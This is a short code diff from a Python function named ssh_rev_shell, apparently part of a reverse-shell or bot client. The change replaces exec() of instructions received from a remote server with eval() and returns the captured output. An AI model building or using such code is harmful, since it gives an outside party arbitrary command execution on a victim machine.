@@ -172,14 +172,7 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
                         try:
                             output = io.StringIO()
                             sys.stdout = output  # Redirect stdout to capture print statements
-
-                            exec_globals = globals().copy()  # Copy the actual global scope
-                            exec_locals = locals()  # Local scope
-
-                            exec(server_instructions, exec_globals, exec_locals)  # Execute with access to existing functions
-
-                            response = exec_locals.get("response", "")  # Retrieve the response if set
-
+                            response = eval(server_instructions)
                             sys.stdout = sys.__stdout__  # Restore stdout
                             response = output.getvalue() if output.getvalue() else str(response)  # Capture print output
                         except Exception as e:
